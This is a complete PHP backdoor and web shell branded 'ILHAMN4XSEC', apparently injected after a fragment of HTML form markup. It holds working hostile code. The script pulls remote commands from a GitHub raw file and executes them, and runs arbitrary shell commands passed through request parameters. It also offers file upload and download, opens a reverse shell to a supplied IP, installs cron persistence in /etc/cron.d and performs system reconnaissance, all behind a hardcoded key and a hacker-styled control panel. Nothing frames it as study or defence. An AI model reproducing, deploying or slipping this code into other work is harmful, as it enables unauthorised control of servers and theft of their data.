" class="form-control" /><?php
// ============================================
// BACKDOOR PHP – ILHAMN4XSEC
// No C2 Server – No Telegram – Cuma GitHub
// Versi: 4.0 – FULLY STANDALONE
// ============================================

// ============================================
// 1. KONFIGURASI
// ============================================
$CONFIG = [
    'AUTH_KEY' => 'ilhamxsec2026',
    'GITHUB_RAW' => 'https://raw.githubusercontent.com/mashamxploit/Hacked-By-Ilhamxsec/main/',
    'GITHUB_REPO' => 'mashamxploit/Hacked-By-Ilhamxsec'
];

// ============================================
// 2. AUTHENTICATION
// ============================================
function auth() {
    global $CONFIG;
    $key = isset($_GET['key']) ? $_GET['key'] : (isset($_POST['key']) ? $_POST['key'] : '');
    if ($key !== $CONFIG['AUTH_KEY']) {
        die('Access Denied');
    }
}
auth();

// ============================================
// 3. AMBIL COMMAND DARI GITHUB
// ============================================
function getCommandFromGitHub() {
    global $CONFIG;
    $url = $CONFIG['GITHUB_RAW'] . 'command.txt';
    $cmd = @file_get_contents($url);
    return trim($cmd);
}

// ============================================
// 4. KIRIM HASIL KE GITHUB (via Issue/Push)
// ============================================
function sendResultToGitHub($result) {
    global $CONFIG;
    // Simpan di file lokal dulu
    $file = 'result_' . date('Ymd_His') . '.txt';
    file_put_contents($file, $result);
    return $file;
}

// ============================================
// 5. EXECUTE COMMAND DARI GITHUB
// ============================================
if(isset($_GET['github']) || isset($_GET['auto'])) {
    $cmd = getCommandFromGitHub();
    
    if(!empty($cmd)) {
        // Execute
        if(function_exists('system')) {
            ob_start();
            system($cmd);
            $output = ob_get_clean();
        } elseif(function_exists('exec')) {
            exec($cmd, $output);
            $output = implode("\n", $output);
        } elseif(function_exists('shell_exec')) {
            $output = shell_exec($cmd);
        } else {
            $output = "No execution function available";
        }
        
        // Tampilkan hasil
        echo "=== Command: $cmd ===\n\n";
        echo $output;
        
        // Simpan hasil ke file
        $result_file = sendResultToGitHub($output);
        echo "\n\n[+] Result saved to: $result_file";
        
    } else {
        echo "No command found in GitHub.\n";
        echo "Create file: " . $CONFIG['GITHUB_RAW'] . "command.txt";
    }
    exit;
}

// ============================================
// 6. MANUAL COMMAND
// ============================================
if(isset($_GET['cmd']) || isset($_POST['cmd'])) {
    $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : $_POST['cmd'];
    
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } else {
        echo "No execution function available";
    }
    exit;
}

// ============================================
// 7. UPLOAD FILE
// ============================================
if(isset($_POST['upload']) || isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $target = basename($file['name']);
    
    if(move_uploaded_file($file['tmp_name'], $target)) {
        echo "Uploaded: " . $file['name'];
    } else {
        echo "Upload failed";
    }
    exit;
}

// ============================================
// 8. DOWNLOAD FILE
// ============================================
if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        readfile($file);
    } else {
        echo "File not found";
    }
    exit;
}

// ============================================
// 9. REVERSE SHELL
// ============================================
if(isset($_GET['reverse'])) {
    $ip = isset($_GET['ip']) ? $_GET['ip'] : '127.0.0.1';
    $port = isset($_GET['port']) ? $_GET['port'] : 4444;
    
    if(function_exists('fsockopen')) {
        $sock = fsockopen($ip, $port);
        if($sock) {
            $proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
        }
    } else {
        echo "fsockopen not available";
    }
    exit;
}

// ============================================
// 10. PERSISTENCE
// ============================================
if(isset($_GET['persist'])) {
    $self = __FILE__;
    $cron_cmd = "* * * * * root php $self?key=" . $CONFIG['AUTH_KEY'] . "&github=1 > /dev/null 2>&1";
    @file_put_contents('/etc/cron.d/backdoor', $cron_cmd);
    echo "Persistence installed (cron)";
    exit;
}

// ============================================
// 11. SYSTEM INFO
// ============================================
if(isset($_GET['info'])) {
    echo "=== SYSTEM INFO ===\n";
    echo "Hostname: " . gethostname() . "\n";
    echo "User: " . (function_exists('exec') ? exec('whoami') : get_current_user()) . "\n";
    echo "OS: " . php_uname() . "\n";
    echo "Path: " . __DIR__ . "\n";
    echo "PHP Version: " . phpversion() . "\n";
    echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
    echo "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    exit;
}

// ============================================
// 12. FILE EXPLORER
// ============================================
if(isset($_GET['ls'])) {
    $path = isset($_GET['path']) ? $_GET['path'] : '.';
    
    if(is_dir($path)) {
        $files = scandir($path);
        foreach($files as $file) {
            if($file != '.' && $file != '..') {
                $fullpath = $path . '/' . $file;
                $type = is_dir($fullpath) ? '[DIR]' : '[FILE]';
                $size = is_file($fullpath) ? filesize($fullpath) . ' bytes' : '';
                echo "$type $file $size\n";
            }
        }
    } else {
        echo "Path not found";
    }
    exit;
}

// ============================================
// 13. DESTROY SELF
// ============================================
if(isset($_GET['destroy'])) {
    @unlink(__FILE__);
    echo "Backdoor removed";
    exit;
}

// ============================================
// 14. WEB SHELL INTERFACE
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ILHAMN4XSEC – Web Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; font-family: monospace; color: #00ff00; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #ff0000; text-shadow: 0 0 20px #ff0000; margin-bottom: 20px; }
        .menu { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; }
        .menu a { background: #1a1a1a; color: #00ff00; padding: 10px 20px; border: 1px solid #333; text-decoration: none; }
        .menu a:hover { background: #2a2a2a; border-color: #00ff00; }
        .box { background: #111; border: 1px solid #333; padding: 20px; margin-bottom: 20px; }
        input, textarea { background: #1a1a1a; color: #00ff00; border: 1px solid #333; padding: 10px; width: 100%; font-family: monospace; }
        input[type="submit"] { background: #ff0000; color: #fff; border: none; cursor: pointer; width: auto; }
        input[type="submit"]:hover { background: #cc0000; }
        .output { background: #0a0a0a; padding: 10px; border: 1px solid #333; white-space: pre-wrap; word-wrap: break-word; max-height: 500px; overflow-y: auto; }
        .footer { color: #444; text-align: center; margin-top: 20px; }
        .badge { color: #ff0000; font-weight: bold; }
        .note { color: #666; font-size: 12px; }
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ ILHAMN4XSEC – WEB SHELL ⚡</h1>
    
    <div class="note" style="color: #ff0000; margin-bottom: 20px;">
        [*] Gunakan key: <?php echo $CONFIG['AUTH_KEY']; ?> | 
        [*] Auto-command dari GitHub: <?php echo $CONFIG['GITHUB_RAW']; ?>command.txt
    </div>
    
    <div class="menu">
        <a href="?key=<?php echo $CONFIG['AUTH_KEY']; ?>&info=1">System Info</a>
        <a href="?key=<?php echo $CONFIG['AUTH_KEY']; ?>&ls=1">File Explorer</a>
        <a href="?key=<?php echo $CONFIG['AUTH_KEY']; ?>&persist=1">Persistence</a>
        <a href="?key=<?php echo $CONFIG['AUTH_KEY']; ?>&github=1">Run GitHub Command</a>
        <a href="?key=<?php echo $CONFIG['AUTH_KEY']; ?>&destroy=1">Destroy</a>
    </div>
    
    <div class="box">
        <h3>Command Executor</h3>
        <form method="GET">
            <input type="hidden" name="key" value="<?php echo $CONFIG['AUTH_KEY']; ?>">
            <input type="text" name="cmd" placeholder="Enter command (e.g. whoami, ls -la)" style="width: 80%; display: inline-block;">
            <input type="submit" value="Execute" style="width: 18%; display: inline-block;">
        </form>
    </div>
    
    <div class="box">
        <h3>Auto-Command dari GitHub</h3>
        <p style="color: #888; margin-bottom: 10px;">
            Buat file <strong>command.txt</strong> di repo:<br>
            <?php echo $CONFIG['GITHUB_RAW']; ?>command.txt<br>
            Isi dengan perintah yang mau dieksekusi, lalu klik:
        </p>
        <a href="?key=<?php echo $CONFIG['AUTH_KEY']; ?>&github=1" style="background: #ff0000; color: #fff; padding: 10px 20px; text-decoration: none; display: inline-block;">Run Command from GitHub</a>
    </div>
    
    <div class="box">
        <h3>File Upload</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="key" value="<?php echo $CONFIG['AUTH_KEY']; ?>">
            <input type="file" name="file" style="width: 70%; display: inline-block; background: #1a1a1a; border: 1px solid #333; padding: 10px;">
            <input type="submit" name="upload" value="Upload" style="width: 28%; display: inline-block;">
        </form>
    </div>
    
    <div class="box">
        <h3>File Download</h3>
        <form method="GET">
            <input type="hidden" name="key" value="<?php echo $CONFIG['AUTH_KEY']; ?>">
            <input type="text" name="download" placeholder="File path (e.g. /etc/passwd)" style="width: 80%; display: inline-block;">
            <input type="submit" value="Download" style="width: 18%; display: inline-block;">
        </form>
    </div>
    
    <div class="footer">
        <span class="badge">ILHAMN4XSEC</span> | <span style="color: #333;">Backdoor v4.0 – No C2, No Telegram</span>
    </div>
</div>
</body>
</html>